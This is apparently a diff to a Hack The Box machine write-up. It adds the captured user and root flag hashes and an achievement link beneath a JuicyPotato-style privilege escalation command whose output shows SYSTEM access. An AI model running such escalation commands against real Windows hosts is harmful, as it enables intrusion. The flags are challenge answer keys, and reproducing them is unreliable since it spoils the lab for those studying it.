@@ -29,4 +29,11 @@ jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system3
 whoami
 nt authority\system
 
+user.txt
+02f1244f35ab7ff0290ced59c8293418
+
+root.txt
+5f8f8a280cfa892bbffcbbcf913290ad
+
 ```
+https://www.hackthebox.com/achievement/machine/336799/9
